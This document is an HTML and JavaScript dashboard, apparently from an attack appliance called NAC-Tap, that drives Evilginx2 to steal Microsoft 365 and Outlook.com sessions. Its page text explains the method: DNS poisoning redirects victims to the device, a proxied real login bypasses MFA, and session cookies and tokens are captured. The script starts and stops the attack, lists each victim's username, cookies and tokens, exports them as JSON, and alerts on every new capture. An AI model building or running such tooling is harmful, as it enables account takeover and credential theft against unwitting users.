<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NAC-Tap - Microsoft Token Capture</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;color:#333}
.container{max-width:1000px;margin:0 auto}
.header{text-align:center;color:#fff;margin-bottom:30px}
.header h1{font-size:2.5em;margin-bottom:5px;text-shadow:2px 2px 4px rgba(0,0,0,.3)}
.header p{font-size:1.1em;opacity:.9}
.dashboard{background:#fff;border-radius:15px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
.status-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:25px;padding-bottom:15px;border-bottom:3px solid #f0f0f0}
.status-badge{display:inline-flex;align-items:center;gap:10px;padding:10px 20px;border-radius:25px;font-weight:700;font-size:1.1em}
.status-badge.active{background:#d4edda;color:#155724}
.status-badge.inactive{background:#f8d7da;color:#721c24}
.status-indicator{width:16px;height:16px;border-radius:50%}
.status-indicator.active{background:#28a745;animation:pulse 2s infinite}
.status-indicator.inactive{background:#dc3545}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.btn-group{display:flex;gap:15px;margin:25px 0;flex-wrap:wrap}
.btn{padding:15px 30px;border:none;border-radius:8px;font-size:1.05em;font-weight:600;cursor:pointer;transition:all .3s}
.btn:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(0,0,0,.2)}
.btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
.btn-start{background:#28a745;color:#fff}
.btn-start:hover:not(:disabled){background:#218838}
.btn-stop{background:#dc3545;color:#fff}
.btn-stop:hover:not(:disabled){background:#c82333}
.btn-download{background:#17a2b8;color:#fff}
.btn-download:hover:not(:disabled){background:#138496}
.info-box{background:#e7f3ff;border-left:4px solid #2196f3;padding:20px;margin:20px 0;border-radius:8px}
.info-box h3{color:#0066cc;margin-bottom:10px;font-size:1.2em}
.info-box p{color:#555;line-height:1.6;margin:5px 0}
.success-box{background:#d4edda;border-left:4px solid #28a745;padding:20px;margin:20px 0;border-radius:8px}
.success-box h3{color:#155724;margin-bottom:10px}
.success-box p{color:#155724;line-height:1.6;margin:5px 0}
.warning-box{background:#fff3cd;border-left:4px solid #ffc107;padding:20px;margin:20px 0;border-radius:8px}
.warning-box h3{color:#856404;margin-bottom:10px}
.warning-box p{color:#856404;line-height:1.6;margin:5px 0}
.error-box{background:#f8d7da;border-left:4px solid #dc3545;padding:20px;margin:20px 0;border-radius:8px}
.error-box h3{color:#721c24;margin-bottom:10px}
.error-box p{color:#721c24;line-height:1.6;margin:5px 0}
.session-card{background:#fff;border:2px solid #28a745;border-radius:10px;padding:20px;margin:15px 0;box-shadow:0 3px 10px rgba(0,0,0,.1)}
.session-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;padding-bottom:10px;border-bottom:2px solid #e0e0e0}
.session-title{font-size:1.3em;color:#28a745;font-weight:700}
.session-time{color:#999;font-size:.9em}
.session-detail{margin:10px 0;font-size:1.05em}
.session-detail strong{color:#333;margin-right:10px}
.session-detail code{background:#f0f0f0;padding:4px 10px;border-radius:4px;font-family:monospace}
.token-box{background:#f8f9fa;padding:15px;border-radius:5px;margin-top:15px;max-height:300px;overflow-y:auto}
.token-box pre{margin:0;font-size:.9em;white-space:pre-wrap;word-wrap:break-word}
.alert{padding:15px 20px;border-radius:8px;margin:15px 0;font-weight:600;display:none}
.alert.show{display:block}
.alert-success{background:#d4edda;color:#155724;border-left:4px solid #28a745}
.alert-error{background:#f8d7da;color:#721c24;border-left:4px solid #dc3545}
.alert-info{background:#d1ecf1;color:#0c5460;border-left:4px solid #17a2b8}
.empty-state{text-align:center;padding:60px 20px;color:#999}
.empty-icon{font-size:5em;margin-bottom:20px;opacity:.5}
details{margin-top:10px;cursor:pointer}
summary{padding:10px;background:#f8f9fa;border-radius:5px;font-weight:600;color:#0066cc}
summary:hover{background:#e9ecef}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>Microsoft Token Capture</h1>
<p>Automated DNS Poisoning + Evilginx2</p>
</div>

<div class="dashboard">
<div id="alert" class="alert"></div>

<!-- STATUS -->
<div class="status-header">
<h2>Evilginx Status</h2>
<div id="statusBadge" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>

<!-- NOT INSTALLED WARNING -->
<div id="notInstalled" style="display:none" class="error-box">
<h3>Evilginx2 Not Installed</h3>
<p>Run this command on the appliance to install:</p>
<pre style="background:#2d2d2d;color:#f8f8f2;padding:15px;border-radius:5px;margin:10px 0;font-size:.95em">cd /opt/nac-tap
sudo ./install-evilginx.sh</pre>
<p style="font-size:.9em;margin-top:10px">Takes 5-10 minutes. Refresh page after installation.</p>
</div>

<!-- CONTROLS -->
<div id="controls" style="display:none">
<div class="info-box">
<h3>How This Works</h3>
<p><strong>1. Automatic DNS poisoning</strong> redirects Microsoft domains to this device</p>
<p><strong>2. Evilginx proxies</strong> real Microsoft login (bypasses MFA)</p>
<p><strong>3. Session cookies captured</strong> when victim authenticates</p>
<p><strong>4. No lure needed</strong> - victim visits Microsoft normally</p>
</div>

<h3 style="margin:20px 0 15px 0;font-size:1.3em">Select Microsoft Service:</h3>
<div class="btn-group">
<button id="btnStartO365" class="btn btn-start" onclick="startAttack('o365')">Start Office 365 Capture</button>
<button id="btnStartOutlook" class="btn btn-start" onclick="startAttack('outlook')">Start Outlook.com Capture</button>
<button id="btnStop" class="btn btn-stop" onclick="stopAttack()" disabled>Stop Capture</button>
</div>

<!-- ACTIVE INFO -->
<div id="activeInfo" style="display:none" class="success-box">
<h3>Attack Active - DNS Poisoning Enabled</h3>
<p><strong>Phishlet:</strong> <span id="phishletName">-</span></p>
<p><strong>Poisoned Domains:</strong> <span id="poisonedDomains">-</span></p>
<p><strong>Bridge IP:</strong> 10.200.66.1</p>
<p style="margin-top:15px;font-weight:600">Waiting for victim to visit Microsoft services...</p>
</div>
</div>

<!-- CAPTURED SESSIONS -->
<div id="sessionsSection" style="display:none">
<h2 style="margin:30px 0 20px 0;font-size:1.8em;color:#667eea">Captured Sessions</h2>
<div id="sessionCount" style="text-align:center;font-size:2em;color:#28a745;font-weight:700;margin:15px 0">0 Sessions</div>
<div id="sessions"></div>

<div class="btn-group" style="margin-top:30px;justify-content:center">
<button class="btn btn-download" onclick="exportSessions()">Export All Sessions (JSON)</button>
<button class="btn btn-stop" onclick="clearSessions()">Clear All Sessions</button>
</div>
</div>

</div>
</div>

<script>
console.log('Microsoft Token Capture UI loaded');

function showAlert(message,type="info"){
const el=document.getElementById("alert");
if(!el)return;
el.className="alert alert-"+type+" show";
el.textContent=message;
setTimeout(function(){el.classList.remove("show")},5000);
}

async function fetchStatus(){
try{
const res=await fetch("/api/status");
const data=await res.json();
updateUI(data);
}catch(err){
console.error("Status fetch error:",err);
setTimeout(fetchStatus,5000);
}
}

function updateUI(data){
const evilginx=data.evilginx;
if(!evilginx)return;

const installed=evilginx.installed;
const running=evilginx.running;
const sessCount=evilginx.sessions_count||0;

// Status badge
const badge=document.getElementById("statusBadge");
if(badge){
badge.className="status-badge "+(running?"active":"inactive");
badge.innerHTML='<span class="status-indicator '+(running?"active":"inactive")+'"></span><span>'+(running?"ACTIVE":"INACTIVE")+'</span>';
}

// Show/hide sections
document.getElementById("notInstalled").style.display=installed?"none":"block";
document.getElementById("controls").style.display=installed?"block":"none";
document.getElementById("sessionsSection").style.display=(installed&&sessCount>0)?"block":"none";

// Button states
const btnO365=document.getElementById("btnStartO365");
const btnOutlook=document.getElementById("btnStartOutlook");
const btnStop=document.getElementById("btnStop");
if(btnO365)btnO365.disabled=running;
if(btnOutlook)btnOutlook.disabled=running;
if(btnStop)btnStop.disabled=!running;

// Active info
const activeInfo=document.getElementById("activeInfo");
if(activeInfo){
if(running){
activeInfo.style.display="block";
document.getElementById("phishletName").textContent=evilginx.phishlet||"Unknown";
const domain=evilginx.lure_url?evilginx.lure_url.replace('http://','').replace('https://',''):'Unknown';
document.getElementById("poisonedDomains").textContent=domain+" + related domains";
}else{
activeInfo.style.display="none";
}
}

// Sessions
if(sessCount>0){
document.getElementById("sessionCount").textContent=sessCount+" Session"+(sessCount>1?"s":"")+" Captured!";

const sessDiv=document.getElementById("sessions");
if(sessDiv&&evilginx.sessions){
var html='';
for(var i=0;i<evilginx.sessions.length;i++){
var s=evilginx.sessions[i];
html+='<div class="session-card">';
html+='<div class="session-header">';
html+='<div class="session-title">Session #'+(i+1)+'</div>';
html+='<div class="session-time">'+new Date(s.timestamp).toLocaleString()+'</div>';
html+='</div>';
html+='<div class="session-detail"><strong>Username:</strong> <code>'+(s.username||'N/A')+'</code></div>';
html+='<div class="session-detail"><strong>Phishlet:</strong> '+(s.phishlet||'N/A')+'</div>';
html+='<details>';
html+='<summary>Show Cookies & Tokens</summary>';
html+='<div class="token-box">';
html+='<h4>Cookies:</h4>';
html+='<pre>'+escapeHtml(s.cookies||'No cookies')+'</pre>';
html+='<h4 style="margin-top:15px">Tokens:</h4>';
html+='<pre>'+escapeHtml(s.tokens||'No tokens')+'</pre>';
html+='</div>';
html+='</details>';
html+='</div>';
}
sessDiv.innerHTML=html;
}
}
}

function escapeHtml(text){
const div=document.createElement('div');
div.textContent=text;
return div.innerHTML;
}

async function startAttack(phishlet){
const serviceName=phishlet==='o365'?'Office 365':'Outlook.com';
if(!confirm("Start capturing "+serviceName+" sessions?\n\nThis will:\n1. Start Evilginx2\n2. Enable DNS poisoning\n3. Intercept Microsoft auth\n\nVictim will be transparent"))return;

const btnO365=document.getElementById("btnStartO365");
const btnOutlook=document.getElementById("btnStartOutlook");
if(btnO365)btnO365.disabled=true;
if(btnOutlook)btnOutlook.disabled=true;

showAlert("Starting "+serviceName+" capture...","info");

try{
const res=await fetch("/api/evilginx/start",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({phishlet:phishlet})
});
const data=await res.json();

if(data.success){
showAlert("Attack started! DNS poisoning active. Waiting for victims...","success");
setTimeout(fetchStatus,1000);
setInterval(fetchStatus,5000);
}else{
showAlert("Failed to start: "+(data.error||"Unknown error"),"error");
if(btnO365)btnO365.disabled=false;
if(btnOutlook)btnOutlook.disabled=false;
}
}catch(err){
showAlert("Error: "+err.message,"error");
if(btnO365)btnO365.disabled=false;
if(btnOutlook)btnOutlook.disabled=false;
}
}

async function stopAttack(){
if(!confirm("Stop Evilginx and DNS poisoning?\n\nCaptured sessions will be saved."))return;

showAlert("Stopping...","info");

try{
const res=await fetch("/api/evilginx/stop",{method:"POST"});
const data=await res.json();

if(data.success){
showAlert("Stopped. Sessions saved.","success");
setTimeout(fetchStatus,1000);
}
}catch(err){
showAlert("Error: "+err.message,"error");
}
}

function exportSessions(){
window.location.href="/api/evilginx/sessions";
}

async function clearSessions(){
if(!confirm("Clear all captured sessions?"))return;

try{
const res=await fetch("/api/evilginx/clear_sessions",{method:"POST"});
if(res.ok){
showAlert("Sessions cleared","success");
setTimeout(fetchStatus,1000);
}
}catch(err){
showAlert("Error: "+err.message,"error");
}
}

// Initialize
fetchStatus();
setInterval(fetchStatus,3000);

// Show notification when new session captured
let lastSessionCount=0;
setInterval(function(){
fetch("/api/status").then(r=>r.json()).then(data=>{
if(data.evilginx&&data.evilginx.sessions_count>lastSessionCount){
const newCount=data.evilginx.sessions_count-lastSessionCount;
showAlert("NEW SESSION CAPTURED! Total: "+data.evilginx.sessions_count,"success");
lastSessionCount=data.evilginx.sessions_count;
}else if(data.evilginx){
lastSessionCount=data.evilginx.sessions_count||0;
}
});
},5000);
</script>
</body>
</html>

